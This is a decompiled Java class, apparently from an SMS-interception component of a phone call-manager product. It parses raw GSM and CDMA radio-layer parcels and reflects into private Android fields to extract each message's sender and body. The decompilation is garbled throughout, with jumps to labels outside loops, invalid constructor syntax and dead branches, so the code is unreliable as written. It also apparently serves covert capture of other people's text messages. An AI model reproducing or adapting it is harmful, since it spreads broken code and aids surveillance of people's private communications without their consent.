package com.vvt.callmanager.filter;

import android.os.Parcel;
import android.telephony.SmsMessage;
import com.android.mockcdma.BearerData;
import com.android.mockcdma.h;
import com.android.mockcdma.k;
import com.vvt.callmanager.a.l;
import com.vvt.sms.SmsInfo;
import com.vvt.sms.SmsInfo.SmsType;
import java.lang.reflect.Field;

public class m
{
  private static final boolean a = com.vvt.callmanager.ref.g.a;
  private static final boolean b = com.vvt.callmanager.ref.g.e;
  
  public static SmsInfo a(Parcel paramParcel)
  {
    SmsInfo localSmsInfo = null;
    l locall = l.a(paramParcel);
    int i = locall.a;
    int j = 1;
    if (i == j)
    {
      i = locall.b;
      j = 1003;
      if (i != j) {
        break label44;
      }
      localSmsInfo = b(paramParcel);
    }
    for (;;)
    {
      return localSmsInfo;
      label44:
      int k = locall.b;
      i = 1020;
      if (k == i) {
        localSmsInfo = c(paramParcel);
      }
    }
  }
  
  private static boolean a(SmsMessage paramSmsMessage)
  {
    boolean bool1 = false;
    int i = 1;
    float f = Float.MIN_VALUE;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject1 = SmsMessage.class;
    Object localObject2 = "mWrappedSmsMessage";
    try
    {
      localObject1 = ((Class)localObject1).getDeclaredField((String)localObject2);
      bool4 = true;
      ((Field)localObject1).setAccessible(bool4);
      localObject2 = ((Field)localObject1).get(paramSmsMessage);
      localObject1 = ((Field)localObject1).getType();
      localObject3 = "userDataHeader";
      localObject1 = ((Class)localObject1).getDeclaredField((String)localObject3);
      bool5 = true;
      ((Field)localObject1).setAccessible(bool5);
      localObject2 = ((Field)localObject1).get(localObject2);
      if (localObject2 != null) {
        break label128;
      }
      bool2 = a;
      if (!bool2) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool4;
        Object localObject3;
        boolean bool5;
        label128:
        Object localObject4;
        int k;
        int j;
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return bool1;
    localObject1 = ((Field)localObject1).getType();
    localObject3 = "concatRef";
    localObject1 = ((Class)localObject1).getDeclaredField((String)localObject3);
    bool5 = true;
    ((Field)localObject1).setAccessible(bool5);
    localObject2 = ((Field)localObject1).get(localObject2);
    localObject1 = ((Field)localObject1).getType();
    localObject3 = "msgCount";
    localObject3 = ((Class)localObject1).getDeclaredField((String)localObject3);
    localObject4 = "seqNumber";
    localObject4 = ((Class)localObject1).getDeclaredField((String)localObject4);
    localObject1 = ((Field)localObject3).get(localObject2);
    localObject1 = (Integer)localObject1;
    k = ((Integer)localObject1).intValue();
    localObject1 = ((Field)localObject4).get(localObject2);
    localObject1 = (Integer)localObject1;
    j = ((Integer)localObject1).intValue();
    bool4 = a;
    if ((!bool4) || (j < k)) {
      j = i;
    }
    for (;;)
    {
      bool1 = j;
      break;
      j = 0;
      localObject1 = null;
    }
  }
  
  private static boolean a(BearerData paramBearerData)
  {
    int i = -1;
    float f1 = 0.0F / 0.0F;
    int k = 1;
    float f2 = Float.MIN_VALUE;
    boolean bool1 = a;
    if (bool1) {}
    k localk = paramBearerData.q;
    h localh;
    int m;
    int n;
    int i3;
    if (localk != null)
    {
      com.android.mockcdma.g localg = localk.d;
      if (localg != null)
      {
        localh = localg.b;
        if (localh != null)
        {
          m = localh.c;
          i = localh.b;
          n = k;
          int i2 = localk.i;
          i3 = n;
          n = m;
          m = i;
          i = i2;
        }
      }
    }
    for (;;)
    {
      boolean bool2 = a;
      if ((!bool2) || (i3 != 0)) {
        if (m >= n) {}
      }
      for (;;)
      {
        j = a;
        if (j != 0) {}
        j = a;
        if (j != 0) {}
        return k;
        k = 0;
        f2 = 0.0F;
        continue;
        m = 153;
        if (j < m)
        {
          k = 0;
          f2 = 0.0F;
        }
      }
      m = j;
      n = k;
      break;
      m = j;
      int i1 = 0;
      localh = null;
      break;
      m = j;
      i1 = j;
      int i4 = 0;
      localk = null;
      int j = 0;
      f1 = 0.0F;
    }
  }
  
  private static SmsInfo b(Parcel paramParcel)
  {
    SmsInfo localSmsInfo = null;
    int i = paramParcel.dataPosition();
    int j = 12;
    paramParcel.setDataPosition(j);
    SmsMessage localSmsMessage = SmsMessage.createFromPdu(com.vvt.callmanager.a.g.a(paramParcel.readString()));
    if (localSmsMessage != null)
    {
      localSmsInfo = new com/vvt/sms/SmsInfo;
      localSmsInfo.<init>();
      Object localObject = SmsInfo.SmsType.GSM;
      localSmsInfo.setType((SmsInfo.SmsType)localObject);
      localObject = localSmsMessage.getDisplayOriginatingAddress();
      localSmsInfo.setPhoneNumber((String)localObject);
      localObject = localSmsMessage.getDisplayMessageBody();
      localSmsInfo.setMessageBody((String)localObject);
      boolean bool = a(localSmsMessage);
      localSmsInfo.setMoreMsgToSend(bool);
    }
    paramParcel.setDataPosition(i);
    return localSmsInfo;
  }
  
  private static SmsInfo c(Parcel paramParcel)
  {
    int i = 0;
    String str1 = null;
    boolean bool2 = a;
    if (bool2) {}
    int k = paramParcel.dataPosition();
    paramParcel.setDataPosition(12);
    paramParcel.readInt();
    paramParcel.readByte();
    paramParcel.readInt();
    int m = (byte)(paramParcel.readInt() & 0xFF);
    int j = (byte)(paramParcel.readInt() & 0xFF);
    paramParcel.readByte();
    j = (byte)(paramParcel.readInt() & 0xFF);
    int n = paramParcel.readByte();
    byte[] arrayOfByte = new byte[n];
    j = 0;
    BearerData localBearerData = null;
    int i1;
    while (j < n)
    {
      i1 = paramParcel.readByte();
      arrayOfByte[j] = i1;
      if (m == 0)
      {
        i1 = com.vvt.callmanager.a.g.a(arrayOfByte[j]);
        arrayOfByte[j] = i1;
      }
      j += 1;
    }
    String str2 = new java/lang/String;
    str2.<init>(arrayOfByte);
    paramParcel.readInt();
    paramParcel.readByte();
    n = paramParcel.readByte();
    arrayOfByte = new byte[n];
    j = 0;
    localBearerData = null;
    while (j < n)
    {
      i1 = paramParcel.readByte();
      arrayOfByte[j] = i1;
      j += 1;
    }
    j = paramParcel.readInt();
    Object localObject = new byte[j];
    while (i < j)
    {
      int i2 = paramParcel.readByte();
      localObject[i] = i2;
      i += 1;
    }
    localBearerData = BearerData.a((byte[])localObject);
    i = 0;
    str1 = null;
    localObject = localBearerData.q;
    if (localObject != null) {
      str1 = ((k)localObject).k;
    }
    paramParcel.setDataPosition(k);
    SmsInfo localSmsInfo = new com/vvt/sms/SmsInfo;
    localSmsInfo.<init>();
    localObject = SmsInfo.SmsType.CDMA;
    localSmsInfo.setType((SmsInfo.SmsType)localObject);
    localSmsInfo.setPhoneNumber(str2);
    localSmsInfo.setMessageBody(str1);
    boolean bool1 = a(localBearerData);
    localSmsInfo.setMoreMsgToSend(bool1);
    bool1 = a;
    if (bool1) {}
    return localSmsInfo;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/m.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */